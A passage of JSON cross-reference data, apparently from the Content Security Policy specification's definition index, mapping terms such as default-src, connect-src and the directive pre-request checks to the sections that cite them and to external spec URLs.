"c62cd7cf": {"dfnID":"c62cd7cf","dfnText":"origin","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-document-origin"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "}],"url":"https://dom.spec.whatwg.org/#concept-document-origin"},
"c6544229": {"dfnID":"c6544229","dfnText":"vchar","external":true,"refSections":[{"refs":[{"id":"ref-for-appendix-B.1"},{"id":"ref-for-appendix-B.1\u2460"},{"id":"ref-for-appendix-B.1\u2461"},{"id":"ref-for-appendix-B.1\u2462"},{"id":"ref-for-appendix-B.1\u2463"},{"id":"ref-for-appendix-B.1\u2464"},{"id":"ref-for-appendix-B.1\u2465"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-appendix-B.1\u2466"},{"id":"ref-for-appendix-B.1\u2467"},{"id":"ref-for-appendix-B.1\u2468"},{"id":"ref-for-appendix-B.1\u2460\u24ea"},{"id":"ref-for-appendix-B.1\u2460\u2460"}],"title":"2.3.1. Source Lists"}],"url":"https://tools.ietf.org/html/rfc5234#appendix-B.1"},
"c6be056c": {"dfnID":"c6be056c","dfnText":"sha-256","external":true,"refSections":[{"refs":[{"id":"ref-for-something\u2460"},{"id":"ref-for-something\u2461"},{"id":"ref-for-something\u2462"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#"},
"c746cc4f": {"dfnID":"c746cc4f","dfnText":"process the iframe attributes","external":true,"refSections":[{"refs":[{"id":"ref-for-process-the-iframe-attributes"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "}],"url":"https://html.spec.whatwg.org/#process-the-iframe-attributes"},
"c847111b": {"dfnID":"c847111b","dfnText":"base","external":true,"refSections":[{"refs":[{"id":"ref-for-the-base-element"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-the-base-element\u2460"}],"title":"6.2.1. base-uri"},{"refs":[{"id":"ref-for-the-base-element\u2461"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "},{"refs":[{"id":"ref-for-the-base-element\u2462"},{"id":"ref-for-the-base-element\u2463"},{"id":"ref-for-the-base-element\u2464"}],"title":"7.3. Nonce Retargeting"}],"url":"https://html.spec.whatwg.org/multipage/semantics.html#the-base-element"},
"ca3ca4ae": {"dfnID":"ca3ca4ae","dfnText":"url parser","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-url-parser"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-concept-url-parser\u2460"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "}],"url":"https://url.spec.whatwg.org/#concept-url-parser"},
"can-compile-strings": {"dfnID":"can-compile-strings","dfnText":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  ","external":false,"refSections":[{"refs":[{"id":"ref-for-can-compile-strings"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "}],"url":"#can-compile-strings"},
"cb98f71f": {"dfnID":"cb98f71f","dfnText":"mode","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-mode"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-mode"},
"cdec7b52": {"dfnID":"cdec7b52","dfnText":"uri-reference","external":true,"refSections":[{"refs":[{"id":"ref-for-section-4.1"},{"id":"ref-for-section-4.1\u2460"},{"id":"ref-for-section-4.1\u2461"}],"title":"6.4.1. report-uri"}],"url":"https://tools.ietf.org/html/rfc3986#section-4.1"},
"child-src": {"dfnID":"child-src","dfnText":"child-src","external":false,"refSections":[{"refs":[{"id":"ref-for-child-src"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-child-src\u2460"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#child-src"},
"connect-src": {"dfnID":"connect-src","dfnText":"connect-src","external":false,"refSections":[{"refs":[{"id":"ref-for-connect-src"}],"title":"6.1.2. connect-src"},{"refs":[{"id":"ref-for-connect-src\u2460"},{"id":"ref-for-connect-src\u2461"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-connect-src\u2462"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#connect-src"},
"contains-a-header-delivered-content-security-policy": {"dfnID":"contains-a-header-delivered-content-security-policy","dfnText":"contains a header-delivered Content Security Policy","external":false,"refSections":[],"url":"#contains-a-header-delivered-content-security-policy"},
"content-security-policy": {"dfnID":"content-security-policy","dfnText":"Content Security Policy","external":false,"refSections":[{"refs":[{"id":"ref-for-content-security-policy"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "}],"url":"#content-security-policy"},
"content-security-policy-object": {"dfnID":"content-security-policy-object","dfnText":"policy","external":false,"refSections":[{"refs":[{"id":"ref-for-content-security-policy-object"},{"id":"ref-for-content-security-policy-object\u2460"},{"id":"ref-for-content-security-policy-object\u2461"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-content-security-policy-object\u2462"},{"id":"ref-for-content-security-policy-object\u2463"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2464"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2465"},{"id":"ref-for-content-security-policy-object\u2466"},{"id":"ref-for-content-security-policy-object\u2467"},{"id":"ref-for-content-security-policy-object\u2468"},{"id":"ref-for-content-security-policy-object\u2460\u24ea"},{"id":"ref-for-content-security-policy-object\u2460\u2460"},{"id":"ref-for-content-security-policy-object\u2460\u2461"},{"id":"ref-for-content-security-policy-object\u2460\u2462"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-content-security-policy-object\u2460\u2463"},{"id":"ref-for-content-security-policy-object\u2460\u2464"},{"id":"ref-for-content-security-policy-object\u2460\u2465"},{"id":"ref-for-content-security-policy-object\u2460\u2466"}],"title":"2.4. Violations"},{"refs":[{"id":"ref-for-content-security-policy-object\u2460\u2467"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2460\u2468"}],"title":"2.4.2. \n    Create a violation object for request, and policy.\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2461\u24ea"},{"id":"ref-for-content-security-policy-object\u2461\u2460"}],"title":"3. \n    Policy Delivery\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2461\u2461"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2461\u2462"},{"id":"ref-for-content-security-policy-object\u2461\u2463"},{"id":"ref-for-content-security-policy-object\u2461\u2464"},{"id":"ref-for-content-security-policy-object\u2461\u2465"},{"id":"ref-for-content-security-policy-object\u2461\u2466"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2461\u2467"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2461\u2468"},{"id":"ref-for-content-security-policy-object\u2462\u24ea"}],"title":"5. \n    Reporting\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2462\u2460"}],"title":"6.1.1.1. \n    child-src Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2462\u2461"}],"title":"6.1.1.2. \n    child-src Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2462\u2462"}],"title":"6.1.2.1. \n    connect-src Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2462\u2463"}],"title":"6.1.2.2. \n    connect-src Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2462\u2464"}],"title":"6.1.3.1. \n    default-src Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2462\u2465"}],"title":"6.1.3.2. \n    default-src Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2462\u2466"}],"title":"6.1.3.3. \n    default-src Inline Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2462\u2467"}],"title":"6.1.4.1. \n    font-src Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2462\u2468"}],"title":"6.1.4.2. \n    font-src Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2463\u24ea"}],"title":"6.1.5.1. \n    frame-src Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2463\u2460"}],"title":"6.1.5.2. \n    frame-src Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2463\u2461"}],"title":"6.1.6.1. \n    img-src Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2463\u2462"}],"title":"6.1.6.2. \n    img-src Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2463\u2463"}],"title":"6.1.7.1. \n    manifest-src Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2463\u2464"}],"title":"6.1.7.2. \n    manifest-src Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2463\u2465"}],"title":"6.1.8.1. \n    media-src Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2463\u2466"}],"title":"6.1.8.2. \n    media-src Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2463\u2467"}],"title":"6.1.9. object-src"},{"refs":[{"id":"ref-for-content-security-policy-object\u2463\u2468"}],"title":"6.1.9.1. \n    object-src Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2464\u24ea"}],"title":"6.1.9.2. \n    object-src Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2464\u2460"}],"title":"6.1.10.1. \n    prefetch-src Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2464\u2461"}],"title":"6.1.10.2. \n    prefetch-src Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2464\u2462"}],"title":"6.1.11.1. \n    script-src Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2464\u2463"}],"title":"6.1.11.2. \n    script-src Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2464\u2464"}],"title":"6.1.11.3. \n    script-src Inline Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2464\u2465"}],"title":"6.1.12.1. \n    script-src-elem Pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2464\u2466"}],"title":"6.1.12.2. \n    script-src-elem Post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2464\u2467"}],"title":"6.1.12.3. \n    script-src-elem Inline Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2464\u2468"}],"title":"6.1.13.1. \n    script-src-attr Inline Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2465\u24ea"}],"title":"6.1.14.1. \n    style-src Pre-request Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2465\u2460"}],"title":"6.1.14.2. \n    style-src Post-request Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2465\u2461"}],"title":"6.1.14.3. \n    style-src Inline Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2465\u2462"}],"title":"6.1.15.1. \n    style-src-elem Pre-request Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2465\u2463"}],"title":"6.1.15.2. \n    style-src-elem Post-request Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2465\u2464"}],"title":"6.1.15.3. \n    style-src-elem Inline Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2465\u2465"}],"title":"6.1.16.1. \n    style-src-attr Inline Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2465\u2466"}],"title":"6.1.17.1. \n    worker-src Pre-request Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2465\u2467"}],"title":"6.1.17.2. \n    worker-src Post-request Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2465\u2468"}],"title":"6.2.2.1. \n    sandbox Response Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2466\u24ea"}],"title":"6.2.2.2. \n    sandbox Initialization\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2466\u2460"}],"title":"6.3.1.1. \n    form-action Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2466\u2461"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2466\u2462"}],"title":"6.3.2.2. \n\t\tRelation to X-Frame-Options\n\t"},{"refs":[{"id":"ref-for-content-security-policy-object\u2466\u2463"}],"title":"6.3.3.1. \n    navigate-to Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2466\u2464"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2466\u2465"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2466\u2466"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2466\u2467"}],"title":"6.6.2.1. \n    Does request violate policy?\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2466\u2468"}],"title":"6.6.2.3. \n    Does request match source list?\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2467\u24ea"}],"title":"6.6.2.4. \n    Does response to request match source list?\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2467\u2460"}],"title":"6.7.4. \n    Should fetch directive execute\n  "},{"refs":[{"id":"ref-for-content-security-policy-object\u2467\u2461"}],"title":"7.1. Nonce Reuse"},{"refs":[{"id":"ref-for-content-security-policy-object\u2467\u2462"}],"title":"9.1. Vendor-specific Extensions and Addons"}],"url":"#content-security-policy-object"},
"csp-list": {"dfnID":"csp-list","dfnText":"CSP list","external":false,"refSections":[{"refs":[{"id":"ref-for-csp-list"}],"title":"2.2. Policies"}],"url":"#csp-list"},
"csp-violation-report": {"dfnID":"csp-violation-report","dfnText":"csp violation report","external":false,"refSections":[{"refs":[{"id":"ref-for-csp-violation-report"},{"id":"ref-for-csp-violation-report\u2460"}],"title":"5. \n    Reporting\n  "},{"refs":[{"id":"ref-for-csp-violation-report\u2461"}],"title":"6.4.1. report-uri"}],"url":"#csp-violation-report"},
"cspviolationreportbody": {"dfnID":"cspviolationreportbody","dfnText":"CSPViolationReportBody","external":false,"refSections":[{"refs":[{"id":"ref-for-cspviolationreportbody"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#cspviolationreportbody"},
"d6e2b0d9": {"dfnID":"d6e2b0d9","dfnText":"ipv6 address","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-ipv6"}],"title":"6.6.2.8. \n    host-part matching\n  "}],"url":"https://url.spec.whatwg.org/#concept-ipv6"},
"d75f6c27": {"dfnID":"d75f6c27","dfnText":"http-network fetch","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-http-network-fetch"},{"id":"ref-for-concept-http-network-fetch\u2460"}],"title":"4.1. \n    Integration with Fetch\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-http-network-fetch"},
"d79a826f": {"dfnID":"d79a826f","dfnText":"integrity metadata","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-integrity-metadata"},{"id":"ref-for-concept-request-integrity-metadata\u2460"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-integrity-metadata"},
"d8b963e8": {"dfnID":"d8b963e8","dfnText":"isomorphic decode","external":true,"refSections":[{"refs":[{"id":"ref-for-isomorphic-decode"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "}],"url":"https://infra.spec.whatwg.org/#isomorphic-decode"},
"d8fc72f5": {"dfnID":"d8fc72f5","dfnText":"script-like","external":true,"refSections":[{"refs":[{"id":"ref-for-request-destination-script-like"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-request-destination-script-like\u2460"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-request-destination-script-like\u2461"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "}],"url":"https://fetch.spec.whatwg.org/#request-destination-script-like"},
"da63e480": {"dfnID":"da63e480","dfnText":"sandboxed origin browsing context flag","external":true,"refSections":[{"refs":[{"id":"ref-for-sandboxed-origin-browsing-context-flag"}],"title":"6.2.2.1. \n    sandbox Response Check\n  "}],"url":"https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-origin-browsing-context-flag"},
"dc1cd39b": {"dfnID":"dc1cd39b","dfnText":"url (for request)","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-url"},{"id":"ref-for-concept-request-url\u2460"}],"title":"2.4.2. \n    Create a violation object for request, and policy.\n  "},{"refs":[{"id":"ref-for-concept-request-url\u2461"},{"id":"ref-for-concept-request-url\u2462"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-request-url\u2463"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-request-url\u2464"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-url"},
"default-src": {"dfnID":"default-src","dfnText":"default-src","external":false,"refSections":[{"refs":[{"id":"ref-for-default-src"}],"title":"6. \n    Content Security Policy Directives\n  "},{"refs":[{"id":"ref-for-default-src\u2460"},{"id":"ref-for-default-src\u2461"},{"id":"ref-for-default-src\u2462"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-default-src\u2463"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "},{"refs":[{"id":"ref-for-default-src\u2464"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#default-src"},
"dictdef-securitypolicyviolationeventinit": {"dfnID":"dictdef-securitypolicyviolationeventinit","dfnText":"SecurityPolicyViolationEventInit","external":false,"refSections":[{"refs":[{"id":"ref-for-dictdef-securitypolicyviolationeventinit"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"#dictdef-securitypolicyviolationeventinit"},
"directive-initialization": {"dfnID":"directive-initialization","dfnText":"initialization","external":false,"refSections":[{"refs":[{"id":"ref-for-directive-initialization"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-directive-initialization\u2460"}],"title":"6.1.14.3. \n    style-src Inline Check\n  "},{"refs":[{"id":"ref-for-directive-initialization\u2461"}],"title":"6.2.2.2. \n    sandbox Initialization\n  "},{"refs":[{"id":"ref-for-directive-initialization\u2462"}],"title":"6.5. \n    Directives Defined in Other Documents\n  "}],"url":"#directive-initialization"},
"directive-inline-check": {"dfnID":"directive-inline-check","dfnText":"inline check","external":false,"refSections":[{"refs":[{"id":"ref-for-directive-inline-check"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-directive-inline-check\u2460"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-directive-inline-check\u2461"},{"id":"ref-for-directive-inline-check\u2462"}],"title":"6.1.3.3. \n    default-src Inline Check\n  "},{"refs":[{"id":"ref-for-directive-inline-check\u2463"}],"title":"6.1.11.3. \n    script-src Inline Check\n  "},{"refs":[{"id":"ref-for-directive-inline-check\u2464"}],"title":"6.1.12.3. \n    script-src-elem Inline Check\n  "},{"refs":[{"id":"ref-for-directive-inline-check\u2465"}],"title":"6.1.13.1. \n    script-src-attr Inline Check\n  "},{"refs":[{"id":"ref-for-directive-inline-check\u2466"}],"title":"6.1.14.3. \n    style-src Inline Check\n  "},{"refs":[{"id":"ref-for-directive-inline-check\u2467"}],"title":"6.1.15.3. \n    style-src-elem Inline Check\n  "},{"refs":[{"id":"ref-for-directive-inline-check\u2468"}],"title":"6.1.16.1. \n    style-src-attr Inline Check\n  "}],"url":"#directive-inline-check"},
"directive-name": {"dfnID":"directive-name","dfnText":"name","external":false,"refSections":[{"refs":[{"id":"ref-for-directive-name"},{"id":"ref-for-directive-name\u2460"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-directive-name\u2461"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-directive-name\u2462"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-directive-name\u2463"},{"id":"ref-for-directive-name\u2464"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-directive-name\u2465"},{"id":"ref-for-directive-name\u2466"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "},{"refs":[{"id":"ref-for-directive-name\u2467"}],"title":"6.1.1.1. \n    child-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-name\u2468"}],"title":"6.1.1.2. \n    child-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-name\u2460\u24ea"}],"title":"6.1.3.1. \n    default-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-name\u2460\u2460"}],"title":"6.1.3.2. \n    default-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-name\u2460\u2461"}],"title":"6.1.3.3. \n    default-src Inline Check\n  "},{"refs":[{"id":"ref-for-directive-name\u2460\u2462"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "},{"refs":[{"id":"ref-for-directive-name\u2460\u2463"}],"title":"6.7.1. \n    Get the effective directive for request\n  "},{"refs":[{"id":"ref-for-directive-name\u2460\u2464"}],"title":"6.7.2. \n    Get the effective directive for inline checks\n  "},{"refs":[{"id":"ref-for-directive-name\u2460\u2465"}],"title":"6.7.4. \n    Should fetch directive execute\n  "}],"url":"#directive-name"},
"directive-navigation-response-check": {"dfnID":"directive-navigation-response-check","dfnText":"navigation response check","external":false,"refSections":[{"refs":[{"id":"ref-for-directive-navigation-response-check"},{"id":"ref-for-directive-navigation-response-check\u2460"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-directive-navigation-response-check\u2461"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "},{"refs":[{"id":"ref-for-directive-navigation-response-check\u2462"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "}],"url":"#directive-navigation-response-check"},
"directive-post-request-check": {"dfnID":"directive-post-request-check","dfnText":"post-request check","external":false,"refSections":[{"refs":[{"id":"ref-for-directive-post-request-check"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2460"}],"title":"4.1.4. \n    Should response to request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2461"},{"id":"ref-for-directive-post-request-check\u2462"}],"title":"6.1.1.2. \n    child-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2463"}],"title":"6.1.2.2. \n    connect-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2464"},{"id":"ref-for-directive-post-request-check\u2465"}],"title":"6.1.3.2. \n    default-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2466"}],"title":"6.1.4.2. \n    font-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2467"}],"title":"6.1.5.2. \n    frame-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2468"}],"title":"6.1.6.2. \n    img-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2460\u24ea"}],"title":"6.1.7.2. \n    manifest-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2460\u2460"}],"title":"6.1.8.2. \n    media-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2460\u2461"}],"title":"6.1.9.2. \n    object-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2460\u2462"}],"title":"6.1.10.2. \n    prefetch-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2460\u2463"}],"title":"6.1.11.2. \n    script-src Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2460\u2464"}],"title":"6.1.12.2. \n    script-src-elem Post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2460\u2465"}],"title":"6.1.14.2. \n    style-src Post-request Check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2460\u2466"}],"title":"6.1.15.2. \n    style-src-elem Post-request Check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2460\u2467"}],"title":"6.1.17.2. \n    worker-src Post-request Check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2460\u2468"}],"title":"6.5. \n    Directives Defined in Other Documents\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2461\u24ea"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "},{"refs":[{"id":"ref-for-directive-post-request-check\u2461\u2460"}],"title":"6.6.2.4. \n    Does response to request match source list?\n  "}],"url":"#directive-post-request-check"},
"directive-pre-navigation-check": {"dfnID":"directive-pre-navigation-check","dfnText":"pre-navigation check","external":false,"refSections":[{"refs":[{"id":"ref-for-directive-pre-navigation-check"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-directive-pre-navigation-check\u2460"}],"title":"6.3.1.1. \n    form-action Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-directive-pre-navigation-check\u2461"}],"title":"6.3.3.1. \n    navigate-to Pre-Navigation Check\n  "}],"url":"#directive-pre-navigation-check"},
"directive-pre-request-check": {"dfnID":"directive-pre-request-check","dfnText":"pre-request check","external":false,"refSections":[{"refs":[{"id":"ref-for-directive-pre-request-check"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2460"},{"id":"ref-for-directive-pre-request-check\u2461"}],"title":"6.1.1.1. \n    child-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2462"}],"title":"6.1.2.1. \n    connect-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2463"},{"id":"ref-for-directive-pre-request-check\u2464"}],"title":"6.1.3.1. \n    default-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2465"}],"title":"6.1.4.1. \n    font-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2466"}],"title":"6.1.5.1. \n    frame-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2467"}],"title":"6.1.6.1. \n    img-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2468"}],"title":"6.1.7.1. \n    manifest-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2460\u24ea"}],"title":"6.1.8.1. \n    media-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2460\u2460"}],"title":"6.1.9.1. \n    object-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2460\u2461"}],"title":"6.1.10.1. \n    prefetch-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2460\u2462"}],"title":"6.1.11.1. \n    script-src Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2460\u2463"}],"title":"6.1.12.1. \n    script-src-elem Pre-request check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2460\u2464"}],"title":"6.1.14.1. \n    style-src Pre-request Check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2460\u2465"}],"title":"6.1.15.1. \n    style-src-elem Pre-request Check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2460\u2466"}],"title":"6.1.17.1. \n    worker-src Pre-request Check\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2460\u2467"}],"title":"6.5. \n    Directives Defined in Other Documents\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2460\u2468"}],"title":"6.6.2.1. \n    Does request violate policy?\n  "},{"refs":[{"id":"ref-for-directive-pre-request-check\u2461\u24ea"}],"title":"6.6.2.3. \n    Does request match source list?\n  "}],"url":"#directive-pre-request-check"},
"directive-response-check": {"dfnID":"directive-response-check","dfnText":"response check","external":false,"refSections":[{"refs":[{"id":"ref-for-directive-response-check"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-directive-response-check\u2460"}],"title":"4.1.4. \n    Should response to request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-directive-response-check\u2461"}],"title":"6.2.2.1. \n    sandbox Response Check\n  "},{"refs":[{"id":"ref-for-directive-response-check\u2462"}],"title":"6.5. \n    Directives Defined in Other Documents\n  "}],"url":"#directive-response-check"},
